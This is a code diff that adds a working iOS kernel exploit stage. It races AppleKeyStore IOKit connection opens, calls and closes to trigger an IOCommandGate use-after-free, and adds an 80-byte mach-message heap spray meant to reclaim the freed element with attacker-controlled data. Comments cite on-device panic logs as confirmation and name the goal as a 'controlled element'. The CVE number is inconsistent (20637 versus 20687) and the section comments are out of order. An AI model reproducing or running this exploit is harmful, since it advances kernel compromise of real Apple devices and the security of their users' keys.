@@ -78,7 +78,116 @@ extern void *IOSurfaceGetBaseAddress(IOSurfaceRef_);
 #define kIOSurfacePixelFormat CFSTR("IOSurfacePixelFormat")
 
 // ===========================================================================
-// 5. CVE-2026-20637 port: AppleSEPKeyStore IOCommandGate UAF
+// 6. CVE-2026-20637 + RECLAIM: the confirmed UAF, now with a kalloc.80 spray
+//    The 25.11 device panic PROVED the UAF: "[iokit.IOCommandGate]: element
+//    modified after free (off:72, val:0xffffffffffffff00, sz:80, ...)" - the
+//    kernel reads and writes a FREED 80-byte gate element.  sz=80 means the
+//    element lives in kalloc.80, so a tight send/receive loop of 80-byte mach
+//    messages filled with our canary churns that zone with our data: if the
+//    panic value ever shows 0xC0FFEE5A... instead of 0xffffffffffffff00, the
+//    freed element was reclaimed by our spray = a controlled gate element.
+// ===========================================================================
+static volatile int g_spray_run = 0;
+static volatile int g_spray_n = 0;
+static mach_port_t g_spray_port = MACH_PORT_NULL;
+
+static void *rs_spray80(void *arg) {
+    (void)arg;
+    if (mach_port_allocate(mach_task_self(), MACH_PORT_TYPE_RECEIVE, &g_spray_port) != KERN_SUCCESS)
+        return NULL;
+    mach_port_insert_right(mach_task_self(), g_spray_port, g_spray_port, MACH_MSG_TYPE_MAKE_SEND);
+    while (g_spray_run) {
+        // exactly 80 bytes: 24-byte header + 56-byte canary body -> kalloc.80
+        struct { mach_msg_header_t h; unsigned char body[56]; } m;
+        memset(&m, 0, sizeof m);
+        m.h.msgh_size = sizeof m;
+        m.h.msgh_local_port = g_spray_port;
+        for (int k = 0; k < 56; k += 8) {
+            uint64_t v = 0xC0FFEE5A00000000ull | (uint64_t)k;
+            memcpy(m.body + k, &v, 8);
+        }
+        // send to ourselves and immediately receive: the kernel allocates
+        // 80 bytes, copies our canary in, then frees it - a tight zone churn
+        kern_return_t kr = mach_msg(&m.h, MACH_SEND_MSG | MACH_RCV_MSG,
+                                    m.h.msgh_size, m.h.msgh_size, g_spray_port,
+                                    MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&g_spray_n, 1);
+        else break;
+    }
+    return NULL;
+}
+
+NSString *ModAksReclaim(void) {
+    AveLog(@"[aks-reclaim] === 20637 UAF + kalloc.80 canary reclaim ===");
+    g_aks_conn = 0; g_aks_done = 0; g_aks_calls = 0; g_aks_closes = 0; g_aks_opens = 0;
+    g_spray_run = 0; g_spray_n = 0;
+
+    CFMutableDictionaryRef m = IOServiceMatching("AppleKeyStore");
+    if (!m) return @"AppleKeyStore: no matching dictionary";
+    io_iterator_t it = 0;
+    if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it)
+        return @"AppleKeyStore: service not found";
+    io_service_t svc = IOIteratorNext(it);
+    IOObjectRelease(it);
+    if (!svc) return @"AppleKeyStore: no service instance";
+
+    // the reclaim spray: 80-byte canary messages churning kalloc.80
+    g_spray_run = 1;
+    pthread_t sp;
+    if (pthread_create(&sp, NULL, rs_spray80, NULL) == 0)
+        AveLog(@"[aks-reclaim] spray thread up (80-byte canary messages)");
+    else
+        AveLog(@"[aks-reclaim] spray thread FAILED to start");
+
+    // 8 callers + 4 closers (the confirmed race)
+    for (int t = 0; t < 8; t++) {
+        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+            while (!g_aks_done) {
+                io_connect_t c = g_aks_conn;
+                if (!c) continue;
+                for (uint32_t sel = 0; sel < 16; sel++) {
+                    uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
+                    IOConnectCallMethod(c, sel, sc, 6, NULL, 0, NULL, NULL, NULL, NULL);
+                    __sync_fetch_and_add(&g_aks_calls, 1);
+                }
+            }
+        });
+    }
+    for (int t = 0; t < 4; t++) {
+        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+            while (!g_aks_done) {
+                io_connect_t c = g_aks_conn;
+                if (!c) continue;
+                IOServiceClose(c);
+                __sync_fetch_and_add(&g_aks_closes, 1);
+                g_aks_conn = 0;
+            }
+        });
+    }
+    // main: the open churn that keeps the race window hot
+    const uint32_t types[4] = {0x2022, 0xbeef, 0x1337, 0x4141};
+    const int N = 60000;
+    for (int i = 0; i < N; i++) {
+        io_connect_t conn = 0;
+        if (IOServiceOpen(svc, mach_task_self(), types[i % 4], &conn) == KERN_SUCCESS && conn) {
+            g_aks_conn = conn;
+            __sync_fetch_and_add(&g_aks_opens, 1);
+        }
+        if ((i & 0x3FFF) == 0x3FFF)
+            AveLog(S(@"[aks-reclaim] %d/%d opens (calls=%d closes=%d spray=%d)",
+                     i, N, g_aks_calls, g_aks_closes, g_spray_n));
+    }
+    g_aks_done = 1; g_spray_run = 0;
+    usleep(200000);
+    if (g_aks_conn) { IOServiceClose(g_aks_conn); g_aks_conn = 0; }
+    IOObjectRelease(svc);
+    AveLog(S(@"[aks-reclaim] done: opens=%d calls=%d closes=%d spray=%d",
+             g_aks_opens, g_aks_calls, g_aks_closes, g_spray_n));
+    AveLog(@"[aks-reclaim] a panic showing 0xC0FFEE5A... = the freed gate element is OURS");
+    AveSetStatus(@"reclaim run done - see the log");
+    return S(@"reclaim: %d opens, %d spray messages; a panic with our canary = controlled element",
+              g_aks_opens, g_spray_n);
+}
 //    Public PoC: github.com/zeroxjf/CVE-2026-20687-AppleSEPKeyStore-UAF
 //    "Target Versions: iOS 26.1 - 26.2 (TESTED)" - our exact build (23C5027f),
 //    fixed in 26.3.  Apple: "An app may be able to cause unexpected system
@@ -90,6 +199,17 @@ extern void *IOSurfaceGetBaseAddress(IOSurfaceRef_);
 //    delay, keeping the close/call race window hot.  The panic is
 //    "[iokit.IOCommandGate]: element modified after free" (a freed 80-byte
 //    gate element at offset 72).
+// ===========================================================================
+// ===========================================================================
+// 5. CVE-2026-20637 port: AppleSEPKeyStore IOCommandGate UAF
+//    Public PoC: github.com/zeroxjf/CVE-2026-20687-AppleSEPKeyStore-UAF
+//    "Target Versions: iOS 26.1 - 26.2 (TESTED)" - our exact build (23C5027f),
+//    fixed in 26.3.  CONFIRMED ON DEVICE 25.11: "[iokit.IOCommandGate]:
+//    element modified after free (off:72, val:0xffffffffffffff00, sz:80)".
+//    Shape: 8 caller threads hammer IOConnectCallMethod on selectors 0-15
+//    while 4 closer threads race IOServiceClose; the main thread opens 100k
+//    connections with rotating types (0x2022/0xbeef/0x1337/0x4141) and NO
+//    delay, keeping the close/call race window hot.
 // ===========================================================================
 static volatile io_connect_t g_aks_conn = 0;
 static volatile int g_aks_done = 0;
